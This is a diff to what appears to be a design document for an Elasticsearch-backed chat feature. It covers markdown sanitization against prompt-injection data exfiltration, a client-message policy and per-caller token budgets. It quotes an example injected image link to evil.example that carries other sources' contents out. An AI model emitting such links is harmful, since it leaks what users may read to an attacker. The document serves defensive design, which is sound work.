@@ -53,12 +53,21 @@ what the best of the four products does:
   document can make the model end with `![.](https://evil.example/p?d=<other sources>)`, and chat
   UIs on the OpenAI route (Open WebUI, LibreChat) render markdown, so the reader's browser would
   send what they may read to the attacker. Every answer, JSON or streamed, native or OpenAI's, is
-  sanitized on the server: a link's or image's `](` becomes `]\(` and its URL a code span, a
-  line-start `[label]:` definition becomes `[label]\:`, a `<` starting a tag or autolink becomes
-  `\<`, and a bare URL becomes a code span. Nothing is removed, so the reader still sees the
-  text. While streaming, text that may still become one of these is held back until it settles,
-  at most 2 KiB. `allow_links: true` keeps inline links (never images) whose URL is exactly one in
-  the given sources' fields.
+  sanitized on the server without following CommonMark's line or container rules (a definition
+  counts inside a block quote or list item, its label may span lines or hold `\]`): every `](`
+  becomes `]\(` and its URL a code span, every `]:` becomes `]\:` (so no reference definition
+  exists for `![x][a]` to use), `\r` and `\r\n` become `\n`, a `<` starting a tag or autolink
+  becomes `&lt;` (a backslash the model writes can't cancel it), and a bare URL, protocol-relative
+  `//host…` too, becomes a code span. Nothing is removed, so the reader still sees the text. While
+  streaming, text that may still become one of these is held back until it settles, at most
+  2 KiB; past that it's released with a last `]`, `<` or `\` as its entity. The tests read the
+  output as GitHub-flavored markdown (comrak) and fail on any link, image or HTML node.
+  `allow_links: true` keeps inline links (never images) whose URL is exactly one in the given
+  sources' fields, and such a bare URL only when whitespace or the answer's end follows it
+  (GFM's autolinks run to the next space). What this leaves to the renderer: kept links carry no
+  `rel` or `referrerpolicy`; code the model writes in a fence is escaped like any text (the cost
+  of escaping whatever the context); and a renderer that links bare domains (markdown-it's fuzzy
+  linkify) can still link `example.com`.
 - **The OpenAI route** drops a client's `system` and `developer` messages (chat UIs send their
   own): the profile's instructions are the only ones the model gets. `tools`, `functions`,
   `n` > 1, logprobs, `response_format` and non-text content are 400s; sampling settings are
@@ -89,7 +98,9 @@ what the best of the four products does:
   and MCP tool call it as the cluster's owner, and a separate privilege would be a roll-only name
   in roles Elasticsearch clients write. The cost is bounded instead: a caller that isn't a browser
   key is held to the profile's `per_caller` limits (turns, prompt and output tokens a minute,
-  answers at once) by its API key, or its user and realm (the owner's own calls share one), and
+  answers at once) by the user who made its API key (a fresh key buys no fresh budget), or its
+  user and realm (the owner's own calls share one; so do roll's index-scoped owner calls, which
+  carry no grant to tell apart and never reach chat), and
   each side together to the profile's `max_tokens_per_day`, 1M unless the owner says otherwise:
   browser keys share one day, every other caller another. One caller at the `per_caller`
   defaults (100k prompt and 20k output tokens a minute) can empty its side's day in about eight
